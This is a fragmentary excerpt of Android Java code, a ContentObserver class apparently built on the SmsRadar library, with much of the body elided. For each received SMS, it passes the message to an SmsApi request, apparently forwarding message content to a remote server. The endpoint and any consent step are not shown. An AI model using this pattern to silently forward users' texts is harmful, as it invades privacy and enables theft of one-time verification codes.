 ...
 *
 * @author `AppTech Inc <dev@apptech.at>
 * @author Khalid AlJahury
 */
class SmsObserver extends ContentObserver {
	...
	void log(String message){
		try {
			if(	SmsRadar.smsListener!=null){
				SmsRadar.smsListener.log( message);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	...
	private void notifySmsListener(Sms sms) {
		if (sms != null) {
			if (SmsType.RECEIVED == sms.getType()) {
				try {
				Log.i(TAG,"sms is RECEIVED:>sendRequest  ");
					if(SmsRadar.smsListener!=null) SmsRadar.smsListener.log("msg received");
				} catch (Exception e) {
					e.printStackTrace();
				}
				new SmsApi().sendRequest(SmsRadar.smsListener,sms);
			}
		}
